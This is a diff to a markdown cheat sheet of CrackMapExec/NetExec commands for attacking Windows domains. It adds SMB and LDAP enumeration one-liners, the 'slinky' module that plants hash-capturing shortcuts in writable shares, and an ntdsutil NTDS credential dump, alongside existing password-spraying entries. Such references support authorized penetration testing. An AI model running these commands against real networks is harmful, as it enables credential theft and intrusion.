@@ -9,7 +9,19 @@ Installation: https://www.netexec.wiki/getting-started/installation
 
 > The same commands for crackmapexec would also work for NetExec
 
-> Other names: cme, nxc 
+> Other names: cme, nxc
+
+## Table of Contents
+- [Enumeration](#enumeration)
+- [Spraying](#spraying)
+- [SMB](#smb)
+- [LDAP](#ldap)
+- [MSSQL](#mssql)
+- [Secrets Dump](#secrets-dump)
+- [Asreproast](#asreproast)
+- [Bloodhound](#bloodhound)
+- [Useful Modules](#useful-modules)
+
 # Enumeration
 ## Initial Enumeration
 ```bash
@@ -64,6 +76,10 @@ crackmapexec smb target -u usernames.txt -p passwords.txt --no-bruteforce --cont
 crackmapexec ssh target(s) -u username -p password --continue-on-success
 ```
 # SMB
+## All In One
+```bash
+crackmapexec smb target -u username -p password --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
+```
 ## Spider_plus Module
 ```bash
 crackmapexec smb target -u username -p password -M spider_plus
@@ -79,6 +95,10 @@ crackmapexec smb target -u username -p password -k --get-file target_file output
 ## Enumerate users using ldap
 ```bash
 crackmapexec ldap target -u '' -p '' --users
+```
+## All In One
+```bash
+crackmapexec ldap target -u username -p password --trusted-for-delegation  --password-not-required --admin-count --users --groups
 ```
 # MSSQL
 ## Authentication
@@ -140,6 +160,16 @@ crackmapexec smb ip -u username -p password -M webdav
 Extracts credentials from local Veeam SQL Database
 ```bash
 crackmapexec smb target -u username -p password -M veeam
+```
+## slinky
+Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions
+```bash
+crackmapexec smb ip -u username -p password -M slinky 
+```
+## ntdsutil
+Dump NTDS with ntdsutil
+```bash
+crackmapexec smb ip -u username -p password -M ntdsutil 
 ```
 ## ldap-checker
 Checks whether LDAP signing and binding are required and/or enforced
